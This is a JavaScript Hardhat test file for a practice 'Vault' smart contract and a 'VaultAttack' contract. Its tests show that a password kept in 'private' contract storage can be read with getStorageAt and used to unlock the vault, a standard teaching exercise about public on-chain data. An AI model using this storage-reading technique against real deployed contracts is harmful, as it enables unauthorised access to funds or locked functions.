const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("VaultAttack", function () {
  let Vault, vault, VaultAttack, vaultAttack;
  let owner, attacker, alice, signers;
  let pwdBytes;
  const pwdStr = "vault is locked with password";

  beforeEach(async function() {
    [owner, attacker, alice, signers] = await ethers.getSigners();
    pwdBytes = stringToBytes32(pwdStr);
    Vault = await ethers.getContractFactory("Vault");
    vault = await Vault.deploy(pwdBytes);
    VaultAttack = await ethers.getContractFactory("VaultAttack");
    vaultAttack = await VaultAttack.connect(attacker).deploy();
  });

  describe("deployment", function() {
    it("should set the attacker", async function() {
      expect(await vaultAttack.attacker()).to.equal(attacker.address);
    });
  });

  describe("#attack", function() {
    it("should be reverted if non-attacker tries", async function() {
      await expect(
        vaultAttack.connect(alice).attack(vault.address, pwdBytes)
      ).to.be.revertedWith(
        "VaultAttack: NOT_OWNER"
      );
    });

    it("should unlock Vault contract if valid password given", async function() {
      const password = await ethers.provider.getStorageAt(vault.address, 1);
      await vaultAttack.connect(attacker).attack(vault.address, password);
      expect(await vault.locked()).to.equal(false);
    });
  });

  describe("Vault#password", function() {
    it("should get the password by using getStorageAt", async function() {
      const password = await ethers.provider.getStorageAt(vault.address, 1);
      expect(ethers.utils.parseBytes32String(password)).to.equal(ethers.utils.parseBytes32String(pwdBytes));
    });
  });

  var Zeros = "0x0000000000000000000000000000000000000000000000000000000000000000";
  function stringToBytes32(str) {
    let bytes = ethers.utils.toUtf8Bytes(str);
    if (bytes.length > 31) { throw new Error('too long'); }
    return ethers.utils.concat([bytes, Zeros]).slice(0, 32);
  }
});
